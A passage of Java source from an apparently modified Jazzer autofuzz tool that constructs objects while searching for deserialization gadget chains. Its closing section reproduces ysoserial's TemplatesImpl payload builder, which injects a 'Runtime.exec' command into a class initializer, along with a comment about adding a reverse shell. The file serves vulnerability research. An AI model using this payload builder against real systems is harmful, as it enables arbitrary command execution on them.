      // // in case of Click1 we need to apply some setters before the chain can
      // // be concretized. At the same time, we do not want to apply setters
      // // everytime because (a) we do not want to waste this time invoking
      // // methods which are not necessary for concretizing the chain and (b) we
      // // are not sure if there are possible side effects of invoking these
      // // setters as well 
      // //
      // // With the below we keep a weighted chance of 25% to apply a setter
	  // int choice2 = ThreadLocalRandom.current().nextInt(0, 4); 
      // boolean applySetters = false;
      // if (choice2 == 0) { 
      //     applySetters = true;
      // }
      boolean applySetters = constructor.getParameterCount() == 0;
      if (visitor != null && applySetters) {
        // Embed the instance creation and setters into an immediately invoked lambda expression to
        // turn them into an expression.
        String uniqueVariableName = visitor.uniqueVariableName();
        visitor.pushGroup(String.format("((java.util.function.Supplier<%1$s>) (() -> {%1$s %2$s = ",
                              type.getCanonicalName(), uniqueVariableName),
            String.format("; %s.", uniqueVariableName),
            String.format("; return %s;})).get()", uniqueVariableName));
      }
      // System.out.println("Instantiating constructor:" + constructor.toString());
      Object obj = autofuzz(data, constructor, visitor);
      // We do not want the setters to be called after an object is
      // instantiated in the sink ID Mode.  This would cause issues with
      // certain classes such as org.apache.commons.collections.FastArrayList
      // where when an empty argument constructor was used it would find some
      // methods with `set`, `add` method names which it would incorrectly flag
      // as the vulnerable argument. We are only interested in the
      // intialization with constructors as a part of the dynamic sinkID Mode
      if (applySetters & ! Meta.isSinkIDMode) {
        List<Method> potentialSetters = getPotentialSetters(type);
        if (!potentialSetters.isEmpty()) {
          List<Method> pickedSetters =
              data.pickValues(potentialSetters, data.consumeInt(0, potentialSetters.size()));
          for (Method setter : pickedSetters) {
            if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
                constructionSteps.add(String.format("Instantiating with a helper method:%s", setter.getName()));
            }
            autofuzz(data, setter, obj, visitor);
          }
          // System.out.println("Iterated through helpers if any");
        }
        if (visitor != null) {
          visitor.popGroup();
        }
      }

      if (Meta.isSinkIDMode) {
          initStack.pop();
      }
      return obj;
    }
    // XXX: In the event conventional methods don't work to synthesize objects we resort
    // to reflection-based tactics to force-create objects from constructors ignoring
    // access specifiers 
    else if (type.getDeclaredConstructors().length > 0) {
      Constructor<?> constructor = data.pickValue(sortExecutables(type.getDeclaredConstructors()));
      if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
          // System.out.println("Instantiating constructor:" + constructor.toString());
          constructionSteps.add(String.format("Instantiating constructor:%s", constructor.toString()));
      }
      constructor.setAccessible(true);
      Object obj = autofuzz(data, constructor, visitor);
      if (Meta.isSinkIDMode) {
          initStack.pop();
      }
      return obj;
    }
    // We are out of more or less canonical ways to construct an instance of this class and have to
    // resort to more heuristic approaches.

    // First, try to find nested classes with names ending in Builder and call a subset of their
    // chaining methods.
    List<Class<?>> nestedBuilderClasses = getNestedBuilderClasses(type);
    if (!nestedBuilderClasses.isEmpty()) {
      Class<?> pickedBuilder = data.pickValue(nestedBuilderClasses);
      List<Method> cascadingBuilderMethods = getCascadingBuilderMethods(pickedBuilder);
      List<Method> originalObjectCreationMethods = getOriginalObjectCreationMethods(pickedBuilder);

      int pickedMethodsNumber = data.consumeInt(0, cascadingBuilderMethods.size());
      List<Method> pickedMethods = data.pickValues(cascadingBuilderMethods, pickedMethodsNumber);
      Method builderMethod = data.pickValue(originalObjectCreationMethods);

      if (visitor != null) {
        // Group for the chain of builder methods.
        visitor.pushGroup("", ".", "");
      }
      Object builderObj =
          autofuzz(data, data.pickValue(sortExecutables(pickedBuilder.getConstructors())), visitor);
      for (Method method : pickedMethods) {
        builderObj = autofuzz(data, method, builderObj, visitor);
      }

      try {
        Object obj = autofuzz(data, builderMethod, builderObj, visitor);
        if (visitor != null) {
          visitor.popGroup();
        }
        if (Meta.isSinkIDMode) {
            initStack.pop();
        }
        return obj;
      } catch (Exception e) {
        throw new AutofuzzConstructionException(e);
      }
    }

    // We ran out of ways to construct an instance of the requested type. If in debug mode, report
    // more detailed information.
    if (!isDebug()) {
      throw new AutofuzzConstructionException();
    } else {
      String summary = String.format(
          "Failed to generate instance of %s:%nAccessible constructors: %s%nNested subclasses: %s%n",
          type.getName(),
          Arrays.stream(type.getConstructors())
              .map(Utils::getReadableDescriptor)
              .collect(Collectors.joining(", ")),
          Arrays.stream(type.getClasses()).map(Class::getName).collect(Collectors.joining(", ")));
      throw new AutofuzzConstructionException(summary);
    }
  }

  static void rescanClasspath() {
    implementingClassesCache.clear();
  }

  static boolean isSerializable(ClassInfo cls) {
      for (ClassInfo iface: cls.getInterfaces()) {
          // System.out.println(String.format("Cls name:%s Iface:%s", cls.getName(), iface.getName()));
          if(iface.getName().equals("java.io.Serializable"))
              return true;
      }
      return false;
  }

  static boolean isTest() {
    String value = System.getenv("JAZZER_AUTOFUZZ_TESTING");
    return value != null && !value.isEmpty();
  }

  static boolean isDebug() {
    String value = System.getenv("JAZZER_AUTOFUZZ_DEBUG");
    return value != null && !value.isEmpty();
  }

  private static int consumeArrayLength(FuzzedDataProvider data, int sizeOfElement) {
    // Spend at most half of the fuzzer input bytes so that the remaining arguments that require
    // construction still have non-trivial data to work with.
    int bytesToSpend = data.remainingBytes() / 2;
    return bytesToSpend / Math.max(sizeOfElement, 1);
  }

  private static String getDebugSummary(
      Executable executable, Object thisObject, Object[] arguments) {
    return String.format("%nMethod: %s::%s%s%nthis: %s%nArguments: %s",
        executable.getDeclaringClass().getName(), executable.getName(),
        Utils.getReadableDescriptor(executable), thisObject,
        Arrays.stream(arguments)
            .map(arg -> arg == null ? "null" : arg.toString())
            .collect(Collectors.joining(", ")));
  }

  private static <T extends Executable> List<T> sortExecutables(T[] executables) {
    List<T> list = Arrays.asList(executables);
    sortExecutables(list);
    return list;
  }

  private static void sortExecutables(List<? extends Executable> executables) {
    executables.sort(Comparator.comparing(Executable::getName).thenComparing(Utils::getDescriptor));
  }

  private static void sortClasses(List<? extends Class<?>> classes) {
    classes.sort(Comparator.comparing(Class::getName));
  }

  private static List<Class<?>> getNestedBuilderClasses(Class<?> type) {
    List<Class<?>> nestedBuilderClasses = nestedBuilderClassesCache.get(type);
    if (nestedBuilderClasses == null) {
      nestedBuilderClasses = Arrays.stream(type.getClasses())
                                 .filter(cls -> cls.getName().endsWith("Builder"))
                                 .filter(cls -> !getOriginalObjectCreationMethods(cls).isEmpty())
                                 .collect(Collectors.toList());
      sortClasses(nestedBuilderClasses);
      nestedBuilderClassesCache.put(type, nestedBuilderClasses);
    }
    return nestedBuilderClasses;
  }

  private static List<Method> getOriginalObjectCreationMethods(Class<?> builder) {
    List<Method> originalObjectCreationMethods = originalObjectCreationMethodsCache.get(builder);
    if (originalObjectCreationMethods == null) {
      originalObjectCreationMethods =
          Arrays.stream(builder.getMethods())
              .filter(m -> m.getReturnType() == builder.getEnclosingClass())
              .collect(Collectors.toList());
      sortExecutables(originalObjectCreationMethods);
      originalObjectCreationMethodsCache.put(builder, originalObjectCreationMethods);
    }
    return originalObjectCreationMethods;
  }

  private static List<Method> getCascadingBuilderMethods(Class<?> builder) {
    List<Method> cascadingBuilderMethods = cascadingBuilderMethodsCache.get(builder);
    if (cascadingBuilderMethods == null) {
      cascadingBuilderMethods = Arrays.stream(builder.getMethods())
                                    .filter(m -> m.getReturnType() == builder)
                                    .collect(Collectors.toList());
      sortExecutables(cascadingBuilderMethods);
      cascadingBuilderMethodsCache.put(builder, cascadingBuilderMethods);
    }
    return cascadingBuilderMethods;
  }

  private static List<Method> getPotentialSetters(Class<?> type) {
    List<Method> potentialSetters = new ArrayList<>();
    Method[] methods = type.getMethods();
    for (Method method : methods) {
      if (void.class.equals(method.getReturnType()) && method.getParameterCount() == 1
          && method.getName().startsWith("set")) {
        //System.out.println("Adding a setter:" + method.getName());
        potentialSetters.add(method);
      }
      // Add additional setter definition
      // XXX: We can make this setter method identification more smarter by potentially introspecting
      // during the static analysis phase which methods are updating the class members
      if (boolean.class.equals(method.getReturnType()) && method.getName().startsWith("add")) {
        //System.out.println("Adding a setter:" + method.getName());
        potentialSetters.add(method);
      }
    }
    sortExecutables(potentialSetters);
    return potentialSetters;
  }

  public static Object[] consumeArguments(
      FuzzedDataProvider data, Executable executable, AutofuzzCodegenVisitor visitor) {
    Object[] result;
    try {
      result = Arrays.stream(executable.getGenericParameterTypes())
                   .map((type) -> consume(data, type, visitor))
                   .toArray();
      return result;
    } catch (AutofuzzConstructionException e) {
      // Do not nest AutofuzzConstructionExceptions.
      throw e;
    } catch (AutofuzzInvocationException e) {
      // If an invocation fails while creating the arguments for another invocation, the exception
      // should not be reported, so we rewrap it.
      throw new AutofuzzConstructionException(e.getCause());
    } catch (Throwable t) {
      throw new AutofuzzConstructionException(t);
    }
  }

  private static Object consumeChecked(FuzzedDataProvider data, Class<?>[] types, int i) {
    if (types[i] == Unknown.class) {
      throw new AutofuzzError("Failed to determine type of argument " + (i + 1));
    }
    Object result;
    try {
      result = consume(data, types[i]);
    } catch (AutofuzzConstructionException e) {
      // Do not nest AutofuzzConstructionExceptions.
      throw e;
    } catch (AutofuzzInvocationException e) {
      // If an invocation fails while creating the arguments for another invocation, the exception
      // should not be reported, so we rewrap it.
      throw new AutofuzzConstructionException(e.getCause());
    } catch (Throwable t) {
      throw new AutofuzzConstructionException(t);
    }
    if (result != null && !types[i].isAssignableFrom(result.getClass())) {
      throw new AutofuzzError("consume returned " + result.getClass() + ", but need " + types[i]);
    }
    return result;
  }

  private static Class<?> getRawType(Type genericType) {
    if (genericType instanceof Class<?>) {
      return (Class<?>) genericType;
    } else if (genericType instanceof ParameterizedType) {
      return getRawType(((ParameterizedType) genericType).getRawType());
    } else if (genericType instanceof WildcardType) {
      // TODO: Improve this.
      return Object.class;
    } else if (genericType instanceof TypeVariable<?>) {
      throw new AutofuzzError("Did not expect genericType to be a TypeVariable: " + genericType);
    } else if (genericType instanceof GenericArrayType) {
      // TODO: Improve this;
      return Object[].class;
    } else {
      throw new AutofuzzError("Got unexpected class implementing Type: " + genericType);
    }
  }

  public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        // System.out.println("Getting class pool instance");
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // System.out.println("Class name:" + clazz.getName());
        // System.out.println("Getting stub class:" + clazz.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static class Foo implements Serializable {
    
        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
    
        private static final long serialVersionUID = -5971610431559700674L;
    
    
        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
    
    
        @Override
        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

	public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
	try {
	    field = clazz.getDeclaredField(fieldName);
	    field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
		return field;
	}

	public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		field.set(obj, value);
	}

}
